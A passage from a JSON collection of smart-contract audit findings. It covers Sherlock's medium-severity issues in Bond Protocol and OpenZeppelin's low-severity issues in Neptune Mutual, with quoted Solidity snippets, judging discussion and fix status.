      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-bond-judging/issues/1",
      "tags": [
        "Oracle",
        "L2 Sequencer",
        "Chainlink"
      ],
      "finders": [
        "Avci"
      ]
    },
    {
      "id": "6688",
      "title": "M-2: \"Equilibrium price\" is not used to compute the capacity (OSDA Only)",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-bond-judging/issues/18 \n\n## Found by \nxiaoming90, Bauer\n\n## Summary\n\n\"Equilibrium price\" is not used to compute the capacity leading to a smaller-than-expected max payout.\n\n## Vulnerability Detail\n\nIn OFDA, it was observed that if the capacity is denominated in the quote token, the capacity will be calculated with the discounted price. \n\n```solidity\nFile: BondBaseOFDA.sol\n118:     function _createMarket(MarketParams memory params_) internal returns (uint256) {\n..SNIP..\n178:         // Calculate the maximum payout amount for this market\n179:         uint256 capacity = params_.capacityInQuote\n180:             ? params_.capacity.mulDiv(\n181:                 scale,\n182:                 price.mulDivUp(\n183:                     uint256(ONE_HUNDRED_PERCENT - params_.fixedDiscount),\n184:                     uint256(ONE_HUNDRED_PERCENT)\n185:                 )\n186:             )\n187:             : params_.capacity;\n188:         market.maxPayout = capacity.mulDiv(uint256(params_.depositInterval), uint256(length));\n```\n\nHowever, in OSDA, if the capacity is denominated in the quote token, the capacity will be calculated with the oracle price instead of the discounted price.\n\n```solidity\nFile: BondBaseOSDA.sol\n122:     function _createMarket(MarketParams memory params_) internal returns (uint256) {\n..SNIP..\n182:         // Calculate the maximum payout amount for this market, determined by deposit interval\n183:         uint256 capacity = params_.capacityInQuote\n184:             ? params_.capacity.mulDiv(scale, price)\n185:             : params_.capacity;\n186:         market.maxPayout = capacity.mulDiv(uint256(params_.depositInterval), uint256(length));\n```\n\nIn OSDA, it was also observed that the base discount is applied to the oracle price while calculating the price decimals because this will be the initial equilibrium price of the market. However, this \"initial equilibrium price\" is not used earlier when computing the capacity.\n\n```solidity\nFile: BondBaseOSDA.sol\n210:     function _validateOracle(\n211:         uint256 id_,\n212:         IBondOracle oracle_,\n213:         ERC20 quoteToken_,\n214:         ERC20 payoutToken_,\n215:         uint48 baseDiscount_\n216:     )\n..SNIP..\n251:         // Get the price decimals for the current oracle price\n252:         // Oracle price is in quote tokens per payout token\n253:         // E.g. if quote token is $10 and payout token is $2000,\n254:         // then the oracle price is 200 quote tokens per payout token.\n255:         // If the oracle has 18 decimals, then it would return 200 * 10^18.\n256:         // In this case, the price decimals would be 2 since 200 = 2 * 10^2.\n257:         // We apply the base discount to the oracle price before calculating\n258:         // since this will be the initial equilibrium price of the market.\n259:         int8 priceDecimals = _getPriceDecimals(\n260:             currentPrice.mulDivUp(\n261:                 uint256(ONE_HUNDRED_PERCENT - baseDiscount_),\n262:                 uint256(ONE_HUNDRED_PERCENT)\n263:             ),\n264:             oracleDecimals\n265:         );\n```\n\n## Impact\n\nAs the discount is not applied to the price when computing the capacity, the price will be higher which leads to a smaller capacity.  A smaller capacity will in turn result in a smaller max payout. A smaller-than-expected max payout reduces the maximum number of payout tokens a user can purchase at any single point in time, which might reduce the efficiency of a Bond market.\n\nUsers who want to purchase a large number of bond tokens have to break their trade into smaller chunks to overcome the smaller-than-expected max payout, leading to unnecessary delay and additional gas fees.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-bond/blob/main/bonds/src/bases/BondBaseOSDA.sol#L122\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nApplied the discount to obtain the \"equilibrium price\" before computing the capacity.\n\n```diff\n// Calculate the maximum payout amount for this market, determined by deposit interval\nuint256 capacity = params_.capacityInQuote\n-\t ? params_.capacity.mulDiv(scale, price)\n+    ? params_.capacity.mulDiv(scale, price.mulDivUp(\n+    \t\tuint256(ONE_HUNDRED_PERCENT - params_.baseDiscount),\n+    \t\tuint256(ONE_HUNDRED_PERCENT)\n+    \t)\n+    )\n    : params_.capacity;\nmarket.maxPayout = capacity.mulDiv(uint256(params_.depositInterval), uint256(length));\n```\n\n## Discussion\n\n**UsmannK**\n\nEscalate for 10 USDC.\n\nThis issue should be Medium, not High. The issue identified is that `BondBaseOFDA` Auctions, in only some cases (`if capacityInQuote=true`), do not take into account the `fixedDiscount` parameter when calculating the auction's `capacity`.\n\nThe capacity in these cases may be **under-calculated**. If there is a situation as:\n\nPayout token: DAI\nQuote token: UNI\nExchange rate: 5 UNI : 1 DAI\nFixed discount: 10%\n`capacityInQuote`: true\n`params_.capacity`: 10\n\nThen the final `capacity` will be calculated as 10/5=`2` instead of 10/(4.5)=`2.222`.\n\nAKA the auction will sell slightly **fewer** tokens than intended, and end early. This is equivalent to a very minor denial of service and is at best a medium issue by the following criteria, taken from the Sherlock docs:\n```\nMedium: There is a viable scenario (even if unlikely) that could cause the protocol to enter a state where a material amount of funds can be lost.\n\nHigh: This vulnerability would result in a material loss of funds, \n```\n\nIf the protocol made this mistake in reverse and actually took slightly extra tokens, it may be closer to a High. But that is not the case. Actually the protocol just sells slightly **fewer** of the owner's tokens than intended, **but sells all of those at the correct price**.\n\n**sherlock-admin**\n\n > Escalate for 10 USDC.\n> \n> This issue should be Medium, not High. The issue identified is that `BondBaseOFDA` Auctions, in only some cases (`if capacityInQuote=true`), do not take into account the `fixedDiscount` parameter when calculating the auction's `capacity`.\n> \n> The capacity in these cases may be **under-calculated**. If there is a situation as:\n> \n> Payout token: DAI\n> Quote token: UNI\n> Exchange rate: 5 UNI : 1 DAI\n> Fixed discount: 10%\n> `capacityInQuote`: true\n> `params_.capacity`: 10\n> \n> Then the final `capacity` will be calculated as 10/5=`2` instead of 10/(4.5)=`2.222`.\n> \n> AKA the auction will sell slightly **fewer** tokens than intended, and end early. This is equivalent to a very minor denial of service and is at best a medium issue by the following criteria, taken from the Sherlock docs:\n> ```\n> Medium: There is a viable scenario (even if unlikely) that could cause the protocol to enter a state where a material amount of funds can be lost.\n> \n> High: This vulnerability would result in a material loss of funds, \n> ```\n> \n> If the protocol made this mistake in reverse and actually took slightly extra tokens, it may be closer to a High. But that is not the case. Actually the protocol just sells slightly **fewer** of the owner's tokens than intended, **but sells all of those at the correct price**.\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Oighty**\n\nIssue fixed here: https://github.com/Bond-Protocol/bonds/pull/47\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/pull/47\n\n**hrishibhat**\n\nEscalation accepted\n\nIssue is a valid medium\nGiven the preconditions and the impact of the incorrect calculation, considering this issue as a valid medium\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> Issue is a valid medium\n> Given the preconditions and the impact of the incorrect calculation, considering this issue as a valid medium\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about an issue in the BondBaseOFDA and BondBaseOSDA smart contracts. The issue is that the capacity is being calculated without taking into account the \"fixedDiscount\" parameter when the capacity is denominated in the quote token. This leads to a smaller-than-expected max payout, reducing the maximum number of payout tokens a user can purchase at any single point in time, which may reduce the efficiency of a Bond market. \n\nThe issue was found by xiaoming90 and Bauer and was manually reviewed. The code snippet is available at https://github.com/sherlock-audit/2023-02-bond/blob/main/bonds/src/bases/BondBaseOSDA.sol#L122. \n\nThe recommendation was to apply the discount to obtain the \"equilibrium price\" before computing the capacity. UsmannK suggested that the issue should be Medium, not High, as the issue identified is that BondBaseOFDA Auctions, in only some cases (if capacityInQuote=true), do not take into account the fixedDiscount parameter when calculating the auction's capacity.\n\nThe issue was fixed in https://github.com/Bond-Protocol/bonds/pull/47 and the escalation was accepted with the issue being considered as a valid medium.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-bond-judging/issues/18",
      "tags": [],
      "finders": [
        "Bauer",
        "xiaoming90"
      ]
    },
    {
      "id": "6687",
      "title": "M-1: The createMarket transaction lack of expiration timestamp check",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-bond-judging/issues/60 \n\n## Found by \nwhitehat\n\n## Summary\n\nThe createMarket transaction lack of expiration timestamp check\n\n## Vulnerability Detail\n\nLet us look into the heavily forked Uniswap V2 contract addLiquidity function implementation\n\nhttps://github.com/Uniswap/v2-periphery/blob/0335e8f7e1bd1e8d8329fd300aea2ef2f36dd19f/contracts/UniswapV2Router02.sol#L61\n\n```solidity\n// **** ADD LIQUIDITY ****\nfunction _addLiquidity(\n\taddress tokenA,\n\taddress tokenB,\n\tuint amountADesired,\n\tuint amountBDesired,\n\tuint amountAMin,\n\tuint amountBMin\n) internal virtual returns (uint amountA, uint amountB) {\n\t// create the pair if it doesn't exist yet\n\tif (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) {\n\t\tIUniswapV2Factory(factory).createPair(tokenA, tokenB);\n\t}\n\t(uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);\n\tif (reserveA == 0 && reserveB == 0) {\n\t\t(amountA, amountB) = (amountADesired, amountBDesired);\n\t} else {\n\t\tuint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);\n\t\tif (amountBOptimal <= amountBDesired) {\n\t\t\trequire(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n\t\t\t(amountA, amountB) = (amountADesired, amountBOptimal);\n\t\t} else {\n\t\t\tuint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);\n\t\t\tassert(amountAOptimal <= amountADesired);\n\t\t\trequire(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n\t\t\t(amountA, amountB) = (amountAOptimal, amountBDesired);\n\t\t}\n\t}\n}\n\nfunction addLiquidity(\n\taddress tokenA,\n\taddress tokenB,\n\tuint amountADesired,\n\tuint amountBDesired,\n\tuint amountAMin,\n\tuint amountBMin,\n\taddress to,\n\tuint deadline\n) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) {\n\t(amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);\n\taddress pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n\tTransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);\n\tTransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);\n\tliquidity = IUniswapV2Pair(pair).mint(to);\n}\n```\n\nthe implementation has two point that worth noting,\n\n**the first point is the deadline check**\n\n```solidity\nmodifier ensure(uint deadline) {\n\trequire(deadline >= block.timestamp, 'UniswapV2Router: EXPIRED');\n\t_;\n}\n```\n\nThe transaction can be pending in mempool for a long time and can be executed in a long time after the user submit the transaction.\n\nProblem is createMarket, which calculates the length and maxPayout by block.timestamp inside it.\n\n```solidity\n        // Calculate market length and check time bounds\n        uint48 length = uint48(params_.conclusion - block.timestamp); \\\n        if (\n            length < minMarketDuration ||\n            params_.depositInterval < minDepositInterval ||\n            params_.depositInterval > length\n        ) revert Auctioneer_InvalidParams();\n\n        // Calculate the maximum payout amount for this market, determined by deposit interval\n        uint256 capacity = params_.capacityInQuote\n            ? params_.capacity.mulDiv(scale, price)\n            : params_.capacity;\n        market.maxPayout = capacity.mulDiv(uint256(params_.depositInterval), uint256(length));\n\n```\n\nAfter the market is created at wrong time, user can call purchase.\nAt purchaseBond(),\n\n```solidity\n        // Payout for the deposit = amount / price\n        //\n        // where:\n        // payout = payout tokens out\n        // amount = quote tokens in\n        // price = quote tokens : payout token (i.e. 200 QUOTE : BASE), adjusted for scaling\n        payout = amount_.mulDiv(term.scale, price);\n\n        // Payout must be greater than user inputted minimum\n        if (payout < minAmountOut_) revert Auctioneer_AmountLessThanMinimum();\n\n        // Markets have a max payout amount, capping size because deposits\n        // do not experience slippage. max payout is recalculated upon tuning\n        if (payout > market.maxPayout) revert Auctioneer_MaxPayoutExceeded();\n```\n\npayout value is calculated by term.scale which the market owner has set assuming the market would be created at desired timestamp.\nEven, maxPayout is far bigger than expected, as it is calculated by very small length.\n\n\n## Impact\n\nEven though the market owner close the market at any time, malicious user can attack the market before close and steal unexpectedly large amount of payout Tokens.\n\n\n## Code Snippet\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUse deadline, like uniswap\n\n\n## Discussion\n\n**Oighty**\n\nAgree with this finding. We have noticed some issues with shorter than expected durations for existing markets. \n\nOur proposed fix is to have users specify a `start` timestamp and a `duration`, which will be used to calculate/set the conclusion. If `block.timestamp` is greater than the `start`, then the txn will revert. Therefore, users must create the market before the target start time. We may allow this to be bypassed by providing a start time of zero, which would then start the market at the `block.timestamp` for the provided `duration`.\n\n**hrishibhat**\n\nGiven the pre-condition that the transaction needs to be in the mempool for a long time for it to have a significant impact,\nconsidering this issue as valid medium\n\n**Oighty**\n\nhttps://github.com/Bond-Protocol/bonds/pull/54\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/pull/54",
      "summary": "\nThis bug report is about the createMarket transaction lacking an expiration timestamp check. This issue was found by whitehat and it affects the Uniswap V2 contract addLiquidity function implementation. \n\nThe transaction can be pending in the mempool for a long time and can be executed in a long time after the user submits the transaction. The problem is with createMarket, which calculates the length and maxPayout by block.timestamp inside it. This means that even if the market owner closes the market at any time, malicious users can attack the market before it closes and steal an unexpectedly large amount of payout tokens.\n\nThe recommended fix is to have users specify a start timestamp and a duration, which will be used to calculate/set the conclusion. If the block.timestamp is greater than the start, then the transaction will revert. This issue has been fixed in a pull request on Github.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-bond-judging/issues/60",
      "tags": [],
      "finders": [
        "whitehat"
      ]
    },
    {
      "id": "10511",
      "title": "Variable outside store",
      "impact": "LOW",
      "content": "In contrast to most of the code base, the [last policy identifier](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/policy/Policy.sol#L32) is saved directly in the `Policy` contract. However, to maintain continuity and prevent conflicts, any new version will [need to import](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/policy/Policy.sol#L35) the old value.\n\n\nConsider saving it in the `Store` contract.\n\n\n**Update:** *Fixed as of commit `1826fa97f1b325d40b0b3446b384dac35074540f` in [pull request #168](https://github.com/neptune-mutual-blue/protocol/pull/168).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Neptune Mutual Audit",
      "source_link": "https://blog.openzeppelin.com/neptune-mutual-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10510",
      "title": "Incorrect individual liquidity share",
      "impact": "LOW",
      "content": "The [calculation](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/VaultLibV1.sol#L107) of an individual’s share of liquidity for a particular cover incorrectly uses `values[5]` instead of `values[4]` as the number of PODs. Since this is always zero, the returned share of liquidity will always be zero.\n\n\nThis has no implications within the current code base but would mislead external users that rely on it. Consider using the correct number of PODs in the calculation.\n\n\n**Update:** *Fixed as of commit `2192646ab5efa95a90521b986c81c05ed04fcd37` in [pull request #166](https://github.com/neptune-mutual-blue/protocol/pull/166).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Neptune Mutual Audit",
      "source_link": "https://blog.openzeppelin.com/neptune-mutual-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10509",
      "title": "The info parameter might lose information about an IPFS hash",
      "impact": "LOW",
      "content": "The `info` parameter of the `report`, [`dispute`](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/governance/Reporter.sol#L190-L196), and other functions assume that the length of the IPFS hash is 32 bytes or shorter. However, that is not the case for [CIDv1](https://github.com/multiformats/cid#cidv1) where the hash can be longer than 32 bytes and also contain prefixes.\n\n\nThis leads to a data availability issue when NPM holders might be unable to retrieve the incident information from the smart contracts. Consequently, they are unable to decide whether to attest or refute the incident.\n\n\nConsider using a different data structure for storing an IPFS hash.\n\n\n**Update:** *Fixed as of commit `5ebb130fe274f0237e368ceaac25751936c1b321` in [pull request #165](https://github.com/neptune-mutual-blue/protocol/pull/165).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Neptune Mutual Audit",
      "source_link": "https://blog.openzeppelin.com/neptune-mutual-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10508",
      "title": "Protocol administrator needs to handle external tokens",
      "impact": "LOW",
      "content": "The protocol administrator is one of the most critical roles with immense privilege in the operation of the entire protocol. For example, only the administrator can [re-initialize](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/Protocol.sol#L78) the protocol, [grant key access control roles](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/Protocol.sol#L283-L287), as well as set up all [staking](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/pool/Staking/StakingPoolBase.sol#L45) and [bonding](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/pool/Bond/BondPoolBase.sol#L54) pools.\n\n\nHowever, when [setting up a staking pool](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/pool/Staking/StakingPoolBase.sol#L36-L46), a [non-zero amount](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/StakingPoolCoreLibV1.sol#L120) of reward tokens are required to be pre-transferred to the administrator account and [pulled to the contract](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/StakingPoolCoreLibV1.sol#L170). This implies that the administrator needs to receive and approve the transaction a priori. This increases the attack surface and may not fit the intended security assumptions for a critical role.\n\n\nConsider either using a less critical role to perform staking pool initialization or allowing pool initialization without any token transfer.\n\n\n**Update:** *Fixed as of commit `71fd05996061b9c438c557c92cd888f4f4c9c542` in [pull request #173](https://github.com/neptune-mutual-blue/protocol/pull/173). The Liquidity Manager must now initialise and manage the staking pools. They must also set up the Bond pools.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Neptune Mutual Audit",
      "source_link": "https://blog.openzeppelin.com/neptune-mutual-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10507",
      "title": "No unstaking window",
      "impact": "LOW",
      "content": "After an incident is resolved, successful stakers can retrieve their rewards [provided the incident has not been finalized](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/ValidationLibV1.sol#L425). When the incident occurred, they will have [at least the claim period](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/governance/resolution/Finalization.sol#L60). However, if the incident was successfully disputed, there is no claim period and the incident can be finalized immediately before stakers have been provided sufficient time to claim their rewards. Consider including an unstaking window for this scenario.\n\n\n**Update:** *Acknowledged, not fixed. The Neptune team stated:*\n\n\n\n> *For incidents resolved as `false reporting`, we intend to restore the cover status to operational as soon as possible. This flexibility allows us to accomplish a speedier finalization while still allowing the tokenholder community sufficient time to unstake their claim (with reward) on a case-by-case basis.*\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Neptune Mutual Audit",
      "source_link": "https://blog.openzeppelin.com/neptune-mutual-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10506",
      "title": "Missing event parameter",
      "impact": "LOW",
      "content": "The [`PoolUpdated` event](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/pool/Staking/StakingPoolBase.sol#L48) does not include the `stakingTarget` parameter. Consider including it.\n\n\n**Update:** *Fixed as of commit `89d30f63d6c43dd3787cd291e31c03a2b712a0a2` in [pull request #163](https://github.com/neptune-mutual-blue/protocol/pull/163).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Neptune Mutual Audit",
      "source_link": "https://blog.openzeppelin.com/neptune-mutual-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10505",
      "title": "Lack of input validation",
      "impact": "LOW",
      "content": "* The [`mustNotExceedNpmThreshold`](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/delegates/VaultDelegateBase.sol#L246) function should validate [`npmStakeToAdd`](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/delegates/VaultDelegateBase.sol#L237) instead of `amount`.\n* The [`setPolicyRatesByKey`](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/policy/PolicyAdmin.sol#L68) function in the `PolicyAdmin` contract does not check that `ceiling` is greater than `floor`, while a similar function [`setPolicyRates`](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/policy/PolicyAdmin.sol#L43) does.\n* The [`initialize`](https://github.com/neptune-mutual-blue/protocol/blob/rc2/audit-start/contracts/core/Protocol.sol#L51-L113) function in the `Protocol` contract does not check the length of the input `values` array.\n* When [computing unstaking rewards](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/GovernanceUtilV1.sol#L430) after an incident resolution, the sum of the `toBurn` and `toReporter` rates are not validated to be bounded above by `ProtoUtilV1.MULTIPLIER`.\n\n\nConsider including the corresponding validations.\n\n\n**Update:** *Fixed as of commit `5ce4b8d3ff0b0a7eb4f0265b4201c93c43af4f30` in [pull request #172](https://github.com/neptune-mutual-blue/protocol/pull/172) and commit `4b929c274100a981107e35d40fbf5b57fabc9be4` in [pull request #196](https://github.com/neptune-mutual-blue/protocol/pull/196).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Neptune Mutual Audit",
      "source_link": "https://blog.openzeppelin.com/neptune-mutual-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10504",
      "title": "Incorrect NPM threshold",
      "impact": "LOW",
      "content": "Some operations require an NPM stake that must not exceed [a threshold](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/ProtoUtilV1.sol#L20), currently set to 10 billion. However, the total NPM supply [cannot exceed 1 billion](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/token/NPM.sol#L10), making the threshold non-functional. The Neptune team indicated the threshold should only be 10 million. Consider updating the constant accordingly.\n\n\n**Update:** *Fixed as of commit `78fafa7314793a3b6b5fe40e1c9129c8f8c4f813` in [pull request #164](https://github.com/neptune-mutual-blue/protocol/pull/164).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Neptune Mutual Audit",
      "source_link": "https://blog.openzeppelin.com/neptune-mutual-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10503",
      "title": "Imprecise bounds",
      "impact": "LOW",
      "content": "There are several examples where the time windows or value ranges are defined inconsistently. In particular:\n\n\n* The `getWithdrawalInfoInternal` function of the `RoutineInvokerLibV1` library considers the `end` timestamp to be [part of the withdrawal period](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/RoutineInvokerLibV1.sol#L70) but the `mustBeDuringWithdrawalPeriod` validation function [does not](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/RoutineInvokerLibV1.sol#L161).\n* The `StakingPoolLibV1` library [prevents withdrawals](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/StakingPoolLibV1.sol#L293) on the block height where withdrawals can start.\n* Neither the [`mustBeBeforeResolutionDeadline` function](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/ValidationLibV1.sol#L261) nor the [`mustBeAfterResolutionDeadline` function](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/ValidationLibV1.sol#L282) will succeed on the resolution deadline.\n* The flash loan fee calculation requires the loan to be [strictly less](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/VaultLibV1.sol#L306) than the available balance, even though the contract [claims](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/VaultLibV1.sol#L347) to loan out the whole balance.\n\n\n**Update:** *Fixed as of commit `3412b68b9d729d0bc5c3b5860ace7a38a06b9835` in [pull request #167](https://github.com/neptune-mutual-blue/protocol/pull/167).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Neptune Mutual Audit",
      "source_link": "https://blog.openzeppelin.com/neptune-mutual-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10502",
      "title": "Implicit timing assumptions",
      "impact": "LOW",
      "content": "To account for the coverage delay, some valid cxTokens [may be excluded](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/cxToken/cxToken.sol#L103) from making claims. Any coverage that will become active [within 14 days](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/cxToken/cxToken.sol#L108) but [before the incident resolution](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/core/cxToken/cxToken.sol#L111) will be disregarded. This implicitly assumes that no valid cover starts after either of these deadlines (otherwise it should also be excluded). Since the coverage delay and resolution window are configurable parameters, the assumptions may not hold. Consider calculating exclusions based on the specific parameters that are relevant to the incident being processed.\n\n\n**Update:** *Fixed as of commit `e00b4248768c196a2b5047dcc21d91a2503452ab` in [pull request #162](https://github.com/neptune-mutual-blue/protocol/pull/162) and commit `4b929c274100a981107e35d40fbf5b57fabc9be4` in [pull request #196](https://github.com/neptune-mutual-blue/protocol/pull/196).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Neptune Mutual Audit",
      "source_link": "https://blog.openzeppelin.com/neptune-mutual-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10501",
      "title": "Collision between constants",
      "impact": "LOW",
      "content": "The [`NS_POOL_MAX_STAKE`](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/StakingPoolCoreLibV1.sol#L27) and [`NS_POOL_REWARD_TOKEN`](https://github.com/neptune-mutual-blue/protocol/blob/73fc82fbe0d1388867b7df669983fe42760daeb1/contracts/libraries/StakingPoolCoreLibV1.sol#L22) constants are defined to be the same string, which introduces the possibility of unexpected storage collisions. In the current code base they are used with non-overlapping data types, which are saved in different mappings. Nevertheless, in the interest of predictability, consider redefining the `NS_POOL_MAX_STAKE` constant to a unique string.\n\n\n**Update:** *Fixed as of commit `90f03dce0d24af3affc50d19ac81bbc12b524a4f` in [pull request #161](https://github.com/neptune-mutual-blue/protocol/pull/161).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Neptune Mutual Audit",
      "source_link": "https://blog.openzeppelin.com/neptune-mutual-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10500",
      "title": "Able to close non-empty staking pool",
      "impact": "LOW",
